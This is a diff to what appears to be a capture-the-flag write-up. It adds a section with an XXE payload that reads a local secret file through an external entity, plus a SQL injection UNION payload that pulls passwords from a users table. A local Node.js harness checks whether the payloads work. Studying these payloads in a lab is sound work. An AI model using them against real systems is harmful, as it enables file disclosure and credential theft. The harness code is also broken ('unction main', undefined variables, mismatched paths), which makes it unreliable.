@@ -164,6 +164,46 @@ function main() {
 ```
   if we try this file locally it returns true , so first test is done.
   
+  XXE test 
+  xxe payload 
+  ```html
+<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///root/ctf/payload/src/xxe_secret'>]><root>&test;</root>
+```
+```html
+function test_xxe(payload) {
+
+	try {
+		var my_secret = Math.random().toString(36).substring(2) ;
+		fs.writeFileSync("/root/ctf/payload/src/xxe_secret",my_secret)
+		var doc = libxml.parseXml(payload, { noent: true ,nonet: true })
+		return doc.toString().includes(my_secret) 
+
+	} catch (e) {
+		return false
+	}
+} 
+
+unction main() {
+	let sql_payload = "' UNION SELECT 1, 2 , password FROM users -- - "
+	let xxe_payload = "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///root/ctf/a_payload_to_rule_them_all/src/xxe_secret'>]><root>&test;</root>"
+	
+	//var sqli = test_sqli(payload)
+	var xxe = test_xxe(xxe_payload)
+	
+
+	Promise.all([sqli,xss]).then( function( values ){
+		console.log('SQL: ' + values[0])
+		console.log('XEE: ' + xxe)
+		
+
+		process.exit(0)
+	})
+
+	
+}
+
+```
+if we access this file locally it returns true , so first test is done.
   
 
 
